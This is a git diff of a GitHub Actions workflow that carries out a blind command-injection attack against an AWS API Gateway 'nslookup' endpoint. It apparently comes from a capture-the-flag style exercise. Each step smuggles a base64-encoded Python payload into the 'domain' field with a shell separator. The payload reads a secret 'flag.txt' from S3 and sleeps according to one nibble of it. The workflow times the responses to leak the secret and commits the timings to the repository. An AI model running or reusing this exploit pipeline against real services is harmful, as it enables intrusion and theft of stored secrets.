@@ -25,66 +25,78 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Phase 2 - resolve ambiguous lo nibbles (sleep=max(1,lo-5), decode=sleep+5)
+      - name: Phase 2 - hi nibbles (sleep=max(1,hi-5), decode=sleep+5)
         run: |
-          B64_P2_1="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIG49ZmxhZ1sxXSYweGYKICAgIHRpbWUuc2xlZXAobWF4KDEsbi01KSkKZXhjZXB0OgogICAgcGFzcw=="
-          B64_P2_2="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIG49ZmxhZ1syXSYweGYKICAgIHRpbWUuc2xlZXAobWF4KDEsbi01KSkKZXhjZXB0OgogICAgcGFzcw=="
-          B64_P2_6="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIG49ZmxhZ1s2XSYweGYKICAgIHRpbWUuc2xlZXAobWF4KDEsbi01KSkKZXhjZXB0OgogICAgcGFzcw=="
-          B64_P2_8="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIG49ZmxhZ1s4XSYweGYKICAgIHRpbWUuc2xlZXAobWF4KDEsbi01KSkKZXhjZXB0OgogICAgcGFzcw=="
-          B64_P2_9="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIG49ZmxhZ1s5XSYweGYKICAgIHRpbWUuc2xlZXAobWF4KDEsbi01KSkKZXhjZXB0OgogICAgcGFzcw=="
-          B64_P2_11="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIG49ZmxhZ1sxMV0mMHhmCiAgICB0aW1lLnNsZWVwKG1heCgxLG4tNSkpCmV4Y2VwdDoKICAgIHBhc3M="
-          B64_P2_12="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIG49ZmxhZ1sxMl0mMHhmCiAgICB0aW1lLnNsZWVwKG1heCgxLG4tNSkpCmV4Y2VwdDoKICAgIHBhc3M="
-          B64_P2_13="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIG49ZmxhZ1sxM10mMHhmCiAgICB0aW1lLnNsZWVwKG1heCgxLG4tNSkpCmV4Y2VwdDoKICAgIHBhc3M="
+          B64_HI_2="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIG49ZmxhZ1syXT4+NAogICAgdGltZS5zbGVlcChtYXgoMSxuLTUpKQpleGNlcHQ6CiAgICBwYXNz"
+          B64_HI_3="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIG49ZmxhZ1szXT4+NAogICAgdGltZS5zbGVlcChtYXgoMSxuLTUpKQpleGNlcHQ6CiAgICBwYXNz"
+          B64_HI_4="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIG49ZmxhZ1s0XT4+NAogICAgdGltZS5zbGVlcChtYXgoMSxuLTUpKQpleGNlcHQ6CiAgICBwYXNz"
+          B64_HI_5="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIG49ZmxhZ1s1XT4+NAogICAgdGltZS5zbGVlcChtYXgoMSxuLTUpKQpleGNlcHQ6CiAgICBwYXNz"
+          B64_HI_8="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIG49ZmxhZ1s4XT4+NAogICAgdGltZS5zbGVlcChtYXgoMSxuLTUpKQpleGNlcHQ6CiAgICBwYXNz"
+          B64_HI_9="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIG49ZmxhZ1s5XT4+NAogICAgdGltZS5zbGVlcChtYXgoMSxuLTUpKQpleGNlcHQ6CiAgICBwYXNz"
+          B64_HI_12="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIG49ZmxhZ1sxMl0+PjQKICAgIHRpbWUuc2xlZXAobWF4KDEsbi01KSkKZXhjZXB0OgogICAgcGFzcw=="
+          B64_HI_13="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIG49ZmxhZ1sxM10+PjQKICAgIHRpbWUuc2xlZXAobWF4KDEsbi01KSkKZXhjZXB0OgogICAgcGFzcw=="
+          B64_HI_14="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIG49ZmxhZ1sxNF0+PjQKICAgIHRpbWUuc2xlZXAobWF4KDEsbi01KSkKZXhjZXB0OgogICAgcGFzcw=="
+          B64_HI_15="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIG49ZmxhZ1sxNV0+PjQKICAgIHRpbWUuc2xlZXAobWF4KDEsbi01KSkKZXhjZXB0OgogICAgcGFzcw=="
 
-          touch timings_p2.txt
-          INJECT="x; echo $B64_P2_1 | base64 -d | python3 #"
+          touch timings_hi_p2.txt
+          INJECT="x; echo $B64_HI_2 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N); curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup -H "Content-Type: application/json" -d @payload.json; END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[1]_lo_p2 ${MS}ms" | tee -a timings_p2.txt
-          INJECT="x; echo $B64_P2_2 | base64 -d | python3 #"
+          echo "byte[2]_hi_p2 ${MS}ms" | tee -a timings_hi_p2.txt
+          INJECT="x; echo $B64_HI_3 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N); curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup -H "Content-Type: application/json" -d @payload.json; END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[2]_lo_p2 ${MS}ms" | tee -a timings_p2.txt
-          INJECT="x; echo $B64_P2_6 | base64 -d | python3 #"
+          echo "byte[3]_hi_p2 ${MS}ms" | tee -a timings_hi_p2.txt
+          INJECT="x; echo $B64_HI_4 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N); curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup -H "Content-Type: application/json" -d @payload.json; END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[6]_lo_p2 ${MS}ms" | tee -a timings_p2.txt
-          INJECT="x; echo $B64_P2_8 | base64 -d | python3 #"
+          echo "byte[4]_hi_p2 ${MS}ms" | tee -a timings_hi_p2.txt
+          INJECT="x; echo $B64_HI_5 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N); curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup -H "Content-Type: application/json" -d @payload.json; END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[8]_lo_p2 ${MS}ms" | tee -a timings_p2.txt
-          INJECT="x; echo $B64_P2_9 | base64 -d | python3 #"
+          echo "byte[5]_hi_p2 ${MS}ms" | tee -a timings_hi_p2.txt
+          INJECT="x; echo $B64_HI_8 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N); curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup -H "Content-Type: application/json" -d @payload.json; END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[9]_lo_p2 ${MS}ms" | tee -a timings_p2.txt
-          INJECT="x; echo $B64_P2_11 | base64 -d | python3 #"
+          echo "byte[8]_hi_p2 ${MS}ms" | tee -a timings_hi_p2.txt
+          INJECT="x; echo $B64_HI_9 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N); curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup -H "Content-Type: application/json" -d @payload.json; END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[11]_lo_p2 ${MS}ms" | tee -a timings_p2.txt
-          INJECT="x; echo $B64_P2_12 | base64 -d | python3 #"
+          echo "byte[9]_hi_p2 ${MS}ms" | tee -a timings_hi_p2.txt
+          INJECT="x; echo $B64_HI_12 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N); curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup -H "Content-Type: application/json" -d @payload.json; END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[12]_lo_p2 ${MS}ms" | tee -a timings_p2.txt
-          INJECT="x; echo $B64_P2_13 | base64 -d | python3 #"
+          echo "byte[12]_hi_p2 ${MS}ms" | tee -a timings_hi_p2.txt
+          INJECT="x; echo $B64_HI_13 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N); curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup -H "Content-Type: application/json" -d @payload.json; END=$(date +%s%N)
           MS=$(( (END - START) / 1000000 ))
-          echo "byte[13]_lo_p2 ${MS}ms" | tee -a timings_p2.txt
+          echo "byte[13]_hi_p2 ${MS}ms" | tee -a timings_hi_p2.txt
+          INJECT="x; echo $B64_HI_14 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N); curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup -H "Content-Type: application/json" -d @payload.json; END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[14]_hi_p2 ${MS}ms" | tee -a timings_hi_p2.txt
+          INJECT="x; echo $B64_HI_15 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N); curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup -H "Content-Type: application/json" -d @payload.json; END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[15]_hi_p2 ${MS}ms" | tee -a timings_hi_p2.txt
 
-          echo "=== PHASE 2 TIMINGS ==="
-          cat timings_p2.txt
+          echo "=== HI NIBBLE PHASE 2 ==="
+          cat timings_hi_p2.txt
 
-      - name: Commit phase2 timings to repo
+      - name: Commit hi-phase2 timings to repo
         run: |
           git config user.email "bot@github-actions"
           git config user.name "GitHub Actions"
-          git add timings.txt timings_p2.txt
-          git commit -m "phase2 timing results [skip ci]" || echo "Nothing to commit"
+          git add timings_hi_p2.txt
+          git commit -m "hi-nibble phase2 timing results [skip ci]" || echo "Nothing to commit"
           git push origin corgi
